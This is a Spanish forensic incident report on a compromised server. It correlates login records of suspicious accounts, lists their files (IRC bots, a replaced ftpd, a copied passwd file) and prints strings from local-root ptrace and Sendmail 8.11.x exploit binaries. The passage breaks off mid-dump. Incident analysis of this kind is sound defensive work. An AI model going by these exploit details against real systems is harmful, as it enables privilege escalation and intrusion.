duende  pts/0        Tue Apr 22 04:42 - 04:43  (00:00)     victima2.foo.bar.mx
duende  pts/1        Tue Apr 22 01:37 - 01:47  (00:09)     victima2.foo.bar.mx
zena     pts/4        Mon Apr 21 21:43 - 23:00 (2+01:16)    dup-200-64-123-100.prodigy.net.mx
duende  pts/5        Mon Apr 21 20:32 - 20:54  (00:21)     victima2.foo.bar.mx
zena     pts/1        Mon Apr 21 19:16 - 20:45  (01:29)     dup-200-64-234-196.prodigy.net.mx
zena     pts/2        Mon Apr 21 19:08 - 19:34  (00:25)     dup-200-64-234-196.prodigy.net.mx
duende  pts/2        Mon Apr 21 17:33 - 17:34  (00:00)     victima2.foo.bar.mx
duende  pts/0        Mon Apr 21 15:55 - 15:56  (00:00)     victima2.foo.bar.mx
duende  pts/0        Mon Apr 21 06:21 - 06:24  (00:02)     victima2.foo.bar.mx
duende  pts/0        Mon Apr 21 02:49 - 02:49  (00:00)     victima2.foo.bar.mx
duende  pts/1        Sun Apr 20 23:33 - 23:34  (00:00)     victima2.foo.bar.mx
duende  pts/1        Sun Apr 20 15:11 - 15:13  (00:02)     victima2.foo.bar.mx
duende  pts/1        Sun Apr 20 15:02 - 15:04  (00:01)     victima2.foo.bar.mx
duende  pts/1        Sun Apr 20 04:38 - 04:38  (00:00)     victima2.foo.bar.mx
duende  pts/1        Sun Apr 20 01:23 - 01:24  (00:00)     victima2.foo.bar.mx
duende  pts/2        Sat Apr 19 20:45 - 20:52  (00:07)     victima2.foo.bar.mx
duende  pts/0        Sat Apr 19 15:10 - 15:10  (00:00)     victima2.foo.bar.mx
duende  pts/0        Sat Apr 19 04:05 - 04:05  (00:00)     victima2.foo.bar.mx
duende  pts/0        Fri Apr 18 23:28 - 23:29  (00:00)     victima2.foo.bar.mx
duende  pts/0        Fri Apr 18 19:57 - 19:59  (00:01)     xxx.xxx.xxx.2
duende  pts/1        Fri Apr 18 14:02 - 14:03  (00:00)     victima2.foo.bar.mx
duende  pts/0        Fri Apr 18 05:00 - 05:03  (00:03)     victima2.foo.bar.mx
duende  pts/0        Fri Apr 18 00:59 - 01:00  (00:00)     victima2.foo.bar.mx
duende  pts/0        Thu Apr 17 20:59 - 21:00  (00:01)     victima2.foo.bar.mx
duende  pts/1        Thu Apr 17 13:54 - 13:55  (00:00)     victima2.foo.bar.mx
duende  pts/1        Thu Apr 17 04:43 - 04:44  (00:01)     victima2.foo.bar.mx
duende  pts/0        Thu Apr 17 04:42 - 04:45  (00:02)     victima2.foo.bar.mx
duende  pts/1        Thu Apr 17 01:41 - 01:43  (00:01)     victima2.foo.bar.mx
duende  pts/0        Wed Apr 16 23:30 - 23:34  (00:03)     victima2.foo.bar.mx
duende  pts/0        Wed Apr 16 23:22 - 23:26  (00:04)     victima2.foo.bar.mx
zena     pts/2        Wed Apr 16 22:56 - 22:57  (00:01)     host-200.77.148.78-cust.telemedia.net.mx
reboot   system boot  Wed Apr 16 22:34         (7+02:41)    2.4.18-bf2.4
proa     pts/7        Wed Apr 16 20:36 - down   (01:52)     dup-200-64-59-111.prodigy.net.mx
proa     pts/7        Wed Apr 16 20:29 - 20:30  (00:00)     dup-200-64-59-111.prodigy.net.mx
zopilote ftp          Wed Apr 16 20:11 - 20:16  (00:04)     bluet.yonsei.ac.kr
zena     pts/6        Wed Apr 16 19:57 - 20:16  (00:19)     dsl-200-67-43-212.prodigy.net.mx
zena     pts/6        Wed Apr 16 19:39 - 19:57  (00:17)     host-200.77.148.78-cust.telemedia.net.mx
zena     pts/6        Wed Apr 16 19:37 - 19:39  (00:01)     host-200.77.148.78-cust.telemedia.net.mx
zena     ftp          Wed Apr 16 19:23 - 19:27  (00:03)     host-200.77.148.78-cust.telemedia.net.mx
duende  pts/6        Wed Apr 16 19:11 - 19:13  (00:01)     victima2.foo.bar.mx
duende  pts/9        Wed Apr 16 14:15 - 14:30  (00:15)     victima2.foo.bar.mx
duende  pts/6        Wed Apr 16 14:05 - 14:24  (00:18)     victima2.foo.bar.mx
proa     ftp          Wed Apr 16 08:51 - 08:52  (00:00)     dup-200-64-59-56.prodigy.net.mx
proa     ftp          Wed Apr 16 08:51 - 08:51  (00:00)     orion.insnet.com
proa     ftp          Wed Apr 16 08:14 - 08:14  (00:00)     orion.insnet.com
proa     ftp          Wed Apr 16 07:58 - 08:00  (00:01)     220.67.202.114
proa     ftp          Wed Apr 16 07:58 - 07:59  (00:00)     cs1.anyang.ac.kr
proa     ftp          Wed Apr 16 07:56 - 07:56  (00:00)     220.67.202.114
duende  pts/9        Wed Apr 16 03:51 - 04:04  (00:12)     victima2.foo.bar.mx
duende  pts/6        Wed Apr 16 03:48 - 04:18  (00:29)     victima2.foo.bar.mx
duende  pts/7        Wed Apr 16 01:57 - 03:48  (01:51)     victima2.foo.bar.mx
duende  pts/6        Wed Apr 16 01:55 - 03:17  (01:22)     victima2.foo.bar.mx
proa     ftp          Wed Apr 16 00:18 - 00:21  (00:02)     61-221-27-214.HINET-IP.hinet.net
proa     ftp          Tue Apr 15 23:54 - 23:57  (00:02)     mail.ubec.com.tw
proa     ftp          Tue Apr 15 23:51 - down   (22:37)     home.obsgyn.org
proa     ftp          Tue Apr 15 23:37 - 23:38  (00:00)     home.obsgyn.org
proa     pts/6        Tue Apr 15 23:36 - 01:55  (02:18)     host-200.77.149.89-cust.telemedia.net.mx
proa     pts/6        Tue Apr 15 23:17 - 23:36  (00:18)     host-200.77.149.89-cust.telemedia.net.mx
proa     pts/6        Tue Apr 15 23:14 - 23:17  (00:03)     host-200.77.149.89-cust.telemedia.net.mx
zena     pts/12       Tue Apr 15 23:08 - down   (23:20)     host-200.77.149.89-cust.telemedia.net.mx
proa     pts/12       Tue Apr 15 23:07 - 23:08  (00:00)     host-200.77.149.89-cust.telemedia.net.mx
duende  pts/11       Tue Apr 15 23:06 - 22:14  (23:07)     victima2.foo.bar.mx
duende  pts/7        Tue Apr 15 22:59 - 01:57  (02:57)     victima2.foo.bar.mx
proa     pts/6        Tue Apr 15 22:59 - 23:14  (00:14)     host-200.77.149.89-cust.telemedia.net.mx
proa     pts/7        Tue Apr 15 22:59 - 22:59  (00:00)     host-200.77.149.89-cust.telemedia.net.mx
duende  pts/6        Tue Apr 15 22:56 - 22:59  (00:02)     victima2.foo.bar.mx
proa     pts/6        Tue Apr 15 22:56 - 22:56  (00:00)     host-200.77.149.89-cust.telemedia.net.mx
proa     pts/6        Tue Apr 15 22:47 - 22:56  (00:08)     host-200.77.149.89-cust.telemedia.net.mx
proa     ftp          Tue Apr 15 22:41 - 22:41  (00:00)     210.110.246.12
proa     pts/7        Tue Apr 15 22:29 - 22:59  (00:29)     host-200.77.149.89-cust.telemedia.net.mx
zena     pts/12       Tue Apr 15 21:45 - 23:07  (01:21)     dsl-200-67-43-212.prodigy.net.mx
zena     pts/11       Tue Apr 15 21:44 - 21:47  (00:03)     host-200.77.148.78-cust.telemedia.net.mx
zena     pts/12       Tue Apr 15 21:42 - 21:45  (00:02)     host-200.77.149.89-cust.telemedia.net.mx
zena     pts/11       Tue Apr 15 21:38 - 21:43  (00:04)     host-200.77.148.78-cust.telemedia.net.mx
zena     pts/10       Tue Apr 15 21:36 - 02:05  (04:28)     host-200.77.149.89-cust.telemedia.net.mx
zena     pts/10       Tue Apr 15 21:34 - 21:35  (00:00)     host-200.77.149.89-cust.telemedia.net.mx
proa     ftp          Tue Apr 15 21:07 - 21:16  (00:09)     extremepages.com
proa     ftp          Tue Apr 15 21:03 - 21:03  (00:00)     extremepages.com
proa     pts/7        Tue Apr 15 18:17 - 18:21  (00:03)     host-200.77.149.89-cust.telemedia.net.mx
proa     pts/7        Tue Apr 15 00:04 - 05:31  (05:26)     host-200.77.149.239-cust.telemedia.net.mx
proa     pts/7        Mon Apr 14 23:58 - 00:04  (00:05)     host-200.77.149.239-cust.telemedia.net.mx
proa     pts/7        Mon Apr 14 23:56 - 23:58  (00:01)     host-200.77.149.239-cust.telemedia.net.mx
proa     pts/7        Mon Apr 14 21:51 - 21:51  (00:00)     host-200.77.146.202-cust.telemedia.net.mx
proa     ftp          Mon Apr 14 00:22 - 00:23  (00:00)     218.236.6.240
proa     ftp          Mon Apr 14 00:22 - 00:22  (00:00)     218.236.6.240
proa     pts/6        Sun Apr 13 23:56 - 04:30  (04:33)     host-200.77.147.219-cust.telemedia.net.mx
proa     pts/6        Sun Apr 13 23:52 - 23:56  (00:04)     host-200.77.147.219-cust.telemedia.net.mx
proa     pts/6        Sun Apr 13 23:51 - 23:52  (00:01)     host-200.77.147.219-cust.telemedia.net.mx
proa     ftp          Sat Apr 12 07:14 - 07:15  (00:00)     ftp.iivip.com
proa     ftp          Sat Apr 12 07:01 - 07:02  (00:01)     mail.ubec.com.tw
proa     pts/2        Sat Apr 12 04:24 - 04:25  (00:00)     host-200.77.144.186-cust.telemedia.net.mx
proa     pts/6        Sat Apr 12 04:23 - 04:25  (00:01)     host-200.77.144.186-cust.telemedia.net.mx
proa     ftp          Sat Apr 12 02:30 - 02:31  (00:00)     extremepages.com
proa     ftp          Sat Apr 12 02:29 - 02:30  (00:00)     extremepages.com
proa     pts/2        Sat Apr 12 02:22 - 04:24  (02:02)     host-200.77.144.186-cust.telemedia.net.mx
proa     ftp          Sat Apr 12 02:20 - 02:20  (00:00)     extremepages.com
proa     ftp          Sat Apr 12 02:16 - 02:18  (00:02)     extremepages.com
proa     ftp          Sat Apr 12 02:13 - 02:14  (00:00)     extremepages.com
proa     pts/2        Fri Apr 11 22:56 - 02:22  (03:26)     localhost
proa     pts/1        Fri Apr 11 22:53 - down  (4+23:34)    orion.insnet.com
zopilote ftp          Fri Apr 11 19:38 - 19:42  (00:04)     smartns.smartweb.net
proa     ftp          Fri Apr 11 19:29 - 19:32  (00:02)     207.202.14.246
proa     ftp          Fri Apr 11 00:12 - 00:14  (00:01)     orion.insnet.com
proa     ftp          Thu Apr 10 23:58 - 23:59  (00:00)     orion.insnet.com
proa     ftp          Thu Apr 10 23:55 - 23:56  (00:00)     orion.insnet.com
proa     ftp          Thu Apr 10 23:35 - 23:40  (00:05)     orion.insnet.com
proa     ftp          Thu Apr 10 23:20 - 23:22  (00:02)     orion.insnet.com
proa     ftp          Thu Apr 10 23:18 - 23:18  (00:00)     orion.insnet.com
proa     ftp          Thu Apr 10 23:17 - 23:17  (00:00)     orion.insnet.com
proa     pts/1        Thu Apr 10 22:46 - 00:12  (01:25)     host-200.77.145.217-cust.telemedia.net.mx
proa     ftp          Thu Apr 10 16:41 - 16:44  (00:03)     iqunam.iquimica.unam.mx
proa     ftp          Thu Apr 10 16:20 - 16:24  (00:03)     mbel.kaist.ac.kr
proa     ftp          Wed Apr  9 22:27 - 22:29  (00:01)     orion.insnet.com
proa     pts/1        Wed Apr  9 20:27 - 21:00  (00:32)     dup-200-64-234-180.prodigy.net.mx
proa     ftp          Wed Apr  9 19:58 - 19:59  (00:00)     mbel.kaist.ac.kr
proa     pts/9        Wed Apr  9 19:17 - 19:18  (00:00)     host-200.77.144.172-cust.telemedia.net.mx
proa     ftp          Wed Apr  9 19:14 - 19:31  (00:16)     cs1.anyang.ac.kr
proa     pts/8        Wed Apr  9 19:10 - 21:17  (02:07)     host-200.77.146.237-cust.telemedia.net.mx
proa     ftp          Wed Apr  9 06:37 - 06:37  (00:00)     mbel.kaist.ac.kr
proa     ftp          Wed Apr  9 06:35 - 06:36  (00:00)     mbel.kaist.ac.kr
proa     pts/1        Wed Apr  9 00:11 - 00:14  (00:02)     dup-200-64-239-90.prodigy.net.mx
proa     ftp          Wed Apr  9 00:02 - 00:07  (00:04)     blackbox.insikt.org
proa     pts/5        Tue Apr  8 23:57 - down  (7+22:30)    dup-200-64-239-90.prodigy.net.mx
proa     ftp          Tue Apr  8 22:55 - 22:58  (00:02)     www2.ecis.com
proa     ftp          Tue Apr  8 22:50 - 22:51  (00:01)     www2.ecis.com
proa     ftp          Tue Apr  8 22:48 - 22:49  (00:00)     www2.ecis.com
proa     ftp          Tue Apr  8 22:33 - 22:40  (00:07)     www2.ecis.com
zopilote pts/1        Tue Apr  8 22:08 - 00:11  (02:02)     dup-200-64-234-9.prodigy.net.mx
proa     ftp          Tue Apr  8 21:55 - 21:57  (00:02)     203.252.206.7
proa     ftp          Tue Apr  8 20:25 - 20:26  (00:00)     bambi.visi.com
proa     ftp          Tue Apr  8 20:01 - 20:02  (00:00)     cugb.edu.cn
proa     ftp          Tue Apr  8 19:51 - 19:52  (00:00)     cugb.edu.cn
proa     pts/1        Tue Apr  8 13:43 - 13:52  (00:09)     200-161-199-225.dsl.telesp.net.br
proa     pts/5        Tue Apr  8 13:36 - 13:42  (00:06)     200-161-199-225.dsl.telesp.net.br
proa     pts/2        Tue Apr  8 13:33 - 13:42  (00:09)     200-161-199-225.dsl.telesp.net.br
proa     pts/2        Tue Apr  8 13:30 - 13:32  (00:02)     200-161-199-225.dsl.telesp.net.br
proa     pts/1        Mon Apr  7 23:01 - 23:04  (00:02)     dup-200-64-123-76.prodigy.net.mx
proa     ftp          Mon Apr  7 17:01 - 17:02  (00:00)     server1.rrudder.com
proa     pts/0        Sun Apr  6 21:13 - 21:14  (00:00)     cpe-66-169-63-039.spart.sc.charter.com
proa     ftp          Sun Apr  6 01:08 - 01:08  (00:00)     www.tvf.com
proa     ftp          Sun Apr  6 01:00 - 01:03  (00:02)     www.tvf.com
proa     ftp          Sun Apr  6 00:55 - 00:55  (00:00)     www.tvf.com
zopilote pts/0        Sun Apr  6 00:02 - 00:03  (00:00)     host-200.77.150.221-cust.telemedia.net.mx
proa     pts/2        Sat Apr  5 23:31 - 23:32  (00:00)     host-200.77.150.221-cust.telemedia.net.mx
proa     pts/1        Sat Apr  5 23:29 - 23:32  (00:03)     host-200.77.150.221-cust.telemedia.net.mx
proa     pts/0        Sat Apr  5 23:25 - 23:31  (00:06)     host-200.77.150.221-cust.telemedia.net.mx
proa     ftp          Sat Apr  5 23:17 - 23:17  (00:00)     www.parner.com.tw
proa     ftp          Sat Apr  5 22:29 - 22:29  (00:00)     www.tvf.com
zopilote ftp          Fri Apr  4 23:12 - 23:27  (00:15)     211.180.102.130
zopilote ftp          Fri Apr  4 21:55 - 22:01  (00:06)     juno.math.msu.edu
proa     ftp          Fri Apr  4 21:39 - 21:40  (00:00)     camar.inn.bppt.go.id
zopilote ftp          Fri Apr  4 20:30 - 20:51  (00:21)     camar.inn.bppt.go.id
proa     ftp          Fri Apr  4 20:29 - 20:29  (00:00)     camar.inn.bppt.go.id
proa     ftp          Fri Apr  4 20:24 - 20:24  (00:00)     202.46.5.6
zopilote ftp          Fri Apr  4 00:22 - 00:23  (00:00)     luna.foo.bar.mx
zopilote ftp          Thu Apr  3 23:56 - 23:58  (00:02)     bambi.visi.com
proa     ftp          Thu Apr  3 23:44 - 23:48  (00:04)     ns1.vitalspeeds.com
zopilote ftp          Thu Apr  3 23:24 - 23:28  (00:03)     cs1.anyang.ac.kr
zopilote ftp          Thu Apr  3 23:11 - 23:15  (00:04)     cs1.anyang.ac.kr
zopilote ftp          Thu Apr  3 22:49 - 22:49  (00:00)     cs1.anyang.ac.kr
zopilote ftp          Thu Apr  3 22:31 - 22:32  (00:01)     extremepages.com
zopilote ftp          Thu Apr  3 22:26 - 22:30  (00:04)     extremepages.com
proa     ftp          Thu Apr  3 22:23 - 22:23  (00:00)     extremepages.com
zopilote pts/0        Thu Apr  3 22:21 - 22:30  (00:08)     dup-200-64-234-186.prodigy.net.mx
proa     pts/2        Thu Apr  3 22:19 - 22:21  (00:01)     dup-200-64-234-186.prodigy.net.mx
proa     ftp          Thu Apr  3 22:13 - 22:18  (00:04)     extremepages.com
proa     ftp          Thu Apr  3 22:02 - 22:06  (00:04)     extremepages.com
proa     ftp          Thu Apr  3 00:23 - 00:23  (00:00)     comp1.kongju.ac.kr
zopilote pts/1        Thu Apr  3 00:18 - 00:23  (00:04)     gobmorelia30.terra.net.mx
proa     pts/1        Wed Apr  2 02:35 - 02:37  (00:02)     gobmorelia34.terra.net.mx
proa     ftp          Wed Apr  2 01:35 - 01:37  (00:01)     bambi.visi.com
zopilote pts/3        Wed Apr  2 00:30 - 00:31  (00:01)     dup-200-64-234-8.prodigy.net.mx
proa     pts/3        Wed Apr  2 00:29 - 00:29  (00:00)     dup-200-64-234-8.prodigy.net.mx
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

 Los accesos de duende aparecen a partir del 15 de abril en las bit'acoras. 

\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
zena     pts/12       Tue Apr 15 23:08 - down   (23:20)     host-200.77.149.89-cust.telemedia.net.mx
proa     pts/12       Tue Apr 15 23:07 - 23:08  (00:00)     host-200.77.149.89-cust.telemedia.net.mx
duende  pts/11       Tue Apr 15 23:06 - 22:14  (23:07)     victima2.foo.bar.mx
duende  pts/7        Tue Apr 15 22:59 - 01:57  (02:57)     victima2.foo.bar.mx
proa     pts/6        Tue Apr 15 22:59 - 23:14  (00:14)     host-200.77.149.89-cust.telemedia.net.mx
proa     pts/7        Tue Apr 15 22:59 - 22:59  (00:00)     host-200.77.149.89-cust.telemedia.net.mx
duende  pts/6        Tue Apr 15 22:56 - 22:59  (00:02)     victima2.foo.bar.mx
proa     pts/6        Tue Apr 15 22:56 - 22:56  (00:00)     host-200.77.149.89-cust.telemedia.net.mx
proa     pts/6        Tue Apr 15 22:47 - 22:56  (00:08)     host-200.77.149.89-cust.telemedia.net.mx
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

Esta entrada muestra que inmediatamente que proa sale de la m'aquina
duende accesa y, cuando duende sale proa entra.  Hay que notar que
duende y zena tienen un accesos con permanencia simult'anea de mas de
23 horas. Las l'ineas indican que proa zena y duende pueden ser la misma
persona, pero duende se conecta inexplicablemente siempre desde
victima2 cuando puede hacerlo sin ning'un obst'aculo directamente hasta
victima1. Muchas veces se repite el patr'on as'i que se piensa que no
es casual.

\subsection*{Revisi'on de las cuentas involucradas}

 Contenido resumido del directorio proa:

\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
?drwxr-xr-x 10 523      523         4096 Apr 16 22:16 ...                                                                                    ?
?drwxr-xr-x  3 523      523         4096 Apr 16 21:33 .king                                                                                  ?
?drwx------  4 523      523         4096 Apr 15 22:20 emech-2.8.3                                                                            ?
?drwx------  2 523      523         4096 Feb  8  2002 ex                                                                                     ?
?drwxr-xr-x  3 523      523         4096 Apr  9 20:25 king                                                                                   ?
?drwxr-xr-x  2 523      523         4096 Jan 15  2001 proa                                                                                   ?
?drwxr-xr-x  8 523      523         4096 Apr 12 05:33 psybnc                                                                                 ?
?-rw-------  1 523      523          404 Apr  9 20:19 .bash_history                                                                          ?
?-rw-r--r--  1 523      523           24 Jan 15  2001 .bash_logout                                                                           ?
?-rw-r--r--  1 523      523          230 Jan 15  2001 .bash_profile                                                                          ?
?-rw-r--r--  1 523      523          124 Jan 15  2001 .bashrc                                                                                ?
?-rw-r--r--  1 523      523       200419 Apr 20 00:00 EriN[ca].seen                                                                          ?
?-rw-r--r--  1 523      523       184395 Apr 20 00:00 victima2`.seen                                                                            ?
?-rw-r--r--  1 523      523          269 Apr 18 20:57 LinkEvents                                                                             ?
?-rw-r--r--  1 523      523       134211 Apr 10 23:56 Xeta.gz                                                                                ?
?-rw-r--r--  1 523      523          143 Apr 20 00:00 bot.users                                                                              ?
?-rw-r--r--  1 523      523        61440 Mar 15 23:40 ex.tar                                                                                 ?
?-rwxr-xr-x  1 523      523       466184 Apr 15 23:39 in.ftpd                                                                                ?
?-rw-r--r--  1 523      523           67 Jan 15  2001 introcd1.ram                                                                           ?
?-rw-r--r--  1 523      523           67 Jan 15  2001 introcd2.ram                                                                           ?
?-rw-r--r--  1 523      523           56 Jan 15  2001 martin990909.cgi                                                                       ?
?-rw-r--r--  1 523      523         1054 Apr 20 00:00 mech.levels                                                                            ?
?-rw-------  1 523      523            5 Apr 16 20:51 mech.pid
?-rw-r--r--  1 523      523          448 Apr 20 00:00 mech.session                                                                           ?
?-rw-r--r--  1 523      523         3989 Apr 11 21:37 mech.set                                                                               ?
?-rw-r--r--  1 523      523       174080 Dec  5  2002 o0o.tar                                                                                ?
?-rw-r--r--  1 523      523          916 Apr 16 23:10 pEpE[mx].seen                                                                          ?
?-rw-r-----  1 523      523        37210 Apr 16 10:01 passwd                                                                                 ?
?-rw-r--r--  1 523      523       970089 Oct 28  2000 psyBNC2.2.1-linux-i86-static.tar.gz                                                    ?
?-rw-r--r--  1 523      523       200679 Nov  5  2000 psyBNC2.2.1.tar.gz                                                                     ?
?-rw-r--r--  1 523      523       200798 Apr 14  2001 psyBNC2.2.2.tar.gz                                                                     ?
?-rw-r--r--  1 523      523       200798 Apr 14  2001 psyBNC2.2.2.tar.gz.1                                                                   ?
?-rw-r--r--  1 523      523      1546240 Feb 13 10:13 psyBNC2.3.1.tar                                                                        ?
?-rw-r--r--  1 523      523       312188 Aug 17  2002 psyBNC2.3.1.tar.gz                                                                     ?
?-rw-r--r--  1 523      523           77 Mar  9 23:40 psybnc.conf 
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm                                                                        

 Contenido resumido del directorio zena:
 
\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
?drwxr-xr-x  9 521      521         4096 Apr 23 19:59 psybnc                                                                                 ?
?drwxr-xr-x  3 521      521         4096 Apr 21 20:22 zena                                                                                   ?
?-rw-------  1 521      521          284 Apr 24 00:29 .bash_history                                                                          ?
?-rw-r--r--  1 521      521           24 Jan 15  2001 .bash_logout                                                                           ?
?-rw-r--r--  1 521      521          230 Jan 15  2001 .bash_profile                                                                          ?
?-rw-r--r--  1 521      521          124 Jan 15  2001 .bashrc                                                                                ?
?-rw-r--r--  1 521      521       200798 Mar 19 18:41 psyBNC2.2.2.tar.gz
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

 Contenido resumido del directorio zopilote:
 
\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
?drwxr-xr-x  5 1019     1019        4096 Apr  8 23:20 emech                                                                                  ?
?drwx------  2 1019     1019        4096 Feb  8  2002 ex                                                                                     ?
?drwxr-xr-x 10 1019     1019        4096 Mar 31 02:13 psybnc                                                                                 ?
?-rw-------  1 1019     1019          74 Apr  4 21:24 .bash_history                                                                          ?
?-rw-r--r--  1 1019     1019          24 Jan 15  2001 .bash_logout                                                                           ?
?-rw-r--r--  1 1019     1019         230 Jan 15  2001 .bash_profile                                                                          ?
?-rw-r--r--  1 1019     1019         124 Jan 15  2001 .bashrc                                                                                ?
?-rw-r--r--  1 1019     1019       61440 Mar 31 00:06 ex.tar                                                                                 ?
?-rw-r-----  1 1019     1019      178862 Jan 29 07:50 mech-linux.tar.gz                                                                      ?
?-rw-r--r--  1 1019     1019     1546240 Mar 30 23:01 psyBNC2.3.1.tar
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

 Contenido resumido del directorio lllll:
 
\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
?drwxr-xr-x  3 1040     1040        4096 Apr 23 22:33 ...                                                                                    ?
?drwx------  2 1040     1040        4096 Feb  8  2002 ex                                                                                     ?
?-rw-------  1 1040     1040          51 Apr 23 22:30 .bash_history                                                                          ?
?-rw-r--r--  1 1040     1040          24 Jan 15  2001 .bash_logout                                                                           ?
?-rw-r--r--  1 1040     1040         230 Jan 15  2001 .bash_profile                                                                          ?
?-rw-r--r--  1 1040     1040         124 Jan 15  2001 .bashrc                                                                                ?
?-rw-r--r--  1 1040     1040         364 Jan 15  2001 dead.letter                                                                            ?
?-rw-r--r--  1 1040     1040       61440 Apr 21 20:37 o0o.tar
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

Contenido resumido del directorio duende:
 
\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
?-rw-r--r--  1 500      500       174080 Dec  5  2002 o0o.tar                                                                                ?
?-rw-r--r--  1 500      500          707 May  8  2001 dump.sh
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm


 Los archivo oOo.tar se repiten en varios de los directorios. El contenido de este paquete es:
 
\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
drwx------ scott/users       0 2002-02-08 07:09:51 ex/
-rwx------ scott/users   14361 2002-02-08 07:09:35 ex/ep
-rwx------ scott/users   14543 2002-02-08 07:09:39 ex/rh
-rwx------ scott/users   23577 2002-02-08 07:09:45 ex/sd
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

 Estos paquetes contienen ejecutables dentro de un directorio llamado
 \verb+ex/+. Verifiquemos la funci'on de estos programas:
 
\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
ep: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), 
	not stripped
rh: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), 
	not stripped
sd: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), 
	not stripped
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

\verb+ex/ep+


\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
waitpid
snprintf
execl
perror
readlink
fprintf
kill
__deregister_frame_info
signal
fork
getppid
ptrace
strcmp
stderr
exit
_IO_stdin_used
__libc_start_main
strlen
__register_frame_info
GLIBC_2.0
PTRh
QVhD
execl
/proc/%i/exe
readlink
child slept outside of execve
/usr/bin/passwd
fork: victim
ptrace: PTRACE_ATTACH
ptrace: PTRACE_CONT
ptrace: PTRACE_GETREGS
ptrace: PTRACE_POKETEXT
ptrace: PTRACE_SETREGS
bug exploited successfully.
enjoy!
ptrace: PTRACE_DETACH
d0h! error!
/bin/sh
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

\verb+ex/rh+

\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim} 
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
waitpid
ioctl
execl
perror
dup2
sleep
pipe
fprintf
__deregister_frame_info
read
setenv
fork
ptrace
sprintf
stderr
exit
atoi
_IO_stdin_used
__libc_start_main
strlen
__register_frame_info
close
GLIBC_2.0
PTRh
read:
/usr/bin/passwd
execl
exec %s %i
PTRACE_GETREGS
waitpid
fork
attach
cont
attached
read
libs
LD_DEBUG
/usr/bin/newgrp
Rhn/shh//bi
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

\verb+ex/sd+

\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
strcpy
printf
stdout
execve
fscanf
fgets
execl
pclose
perror
dup2
system
optarg
fflush
popen
fprintf
kill
strcat
__deregister_frame_info
chdir
wait
setgid
signal
setenv
fork
sscanf
getopt
memset
getppid
getcwd
sprintf
fclose
access
exit
fopen
_IO_stdin_used
__libc_start_main
strlen
setuid
mkdir
__register_frame_info
close
__xstat
GLIBC_2.1
GLIBC_2.0
PTRh
QVhT
/bin/rm -rf %s > /dev/null 2> /dev/null
EGG=
%u-%u.%u-
%s [command] [options]
-h     this help
-d     specify depth of analysis (default=32)
-o     change offset (default = -32000)
-v     specify victim (default /usr/sbin/sendmail)
-t     specify temp directory (default /tmp/.sxp)
-b      enables bruteforce (WARNING: this may take about 20-30 minutes!)
/usr/sbin/sendmail
Voila babe, entering rootshell!
Enjoy!
/usr/bin/id
/dev/null
BASH_HISTORY
-bash
/bin/bash
...-=[ Sendmail 8.11.x exploit, (c)oded by sd@sf.cz [sd@ircnet], 2001 ]=-...
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
hd:o:v:t:b
[*] Using brute force, this may take some time
%s%s/%s
[*] Victim = %s
[*] Depth  = %d
[*] Offset = %d
[*] Temp   = %s
[*] ESP    = 0x%08x
[-] Bad: %s isn't suid ;(
[-] Bad: We haven't access to %s !
[-] Can't create our tempdir!
[+] Created %s
objdump
%s -R %s | grep setuid
[-] Cannot get setuid() GOT
[+] Step 1. setuid() got = 0x%08x
%s/sm
[*] Step 2. Copying %s to %s...
/bin/cp -f %s %s
Failed
[*] Step 3. Disassembling %s...
grep
%s -d %s 2> /dev/null | %s -B %d "mov.*%%.l,(%%e..,%%e..,1)" | %s ".mov .*0x80.*,%%e.."
%s -d %s 2> /dev/null | %s ".mov .*0x80.*,%%e.."
%x: %s %s %s %s %s %s 0x%x,%s
/usr/bin/id
/dev/null
BASH_HISTORY
-bash
/bin/bash
...-=[ Sendmail 8.11.x exploit, (c)oded by sd@sf.cz [sd@ircnet], 2001 ]=-...
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
hd:o:v:t:b
[*] Using brute force, this may take some time
%s%s/%s
